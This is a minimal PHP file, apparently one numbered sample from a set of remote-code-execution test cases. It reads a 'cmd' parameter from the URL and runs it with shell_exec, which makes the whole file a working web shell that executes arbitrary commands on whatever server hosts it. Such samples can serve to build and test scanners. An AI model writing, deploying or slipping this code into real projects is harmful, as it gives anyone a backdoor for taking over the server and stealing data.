<?php
// RCE test variation #279
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>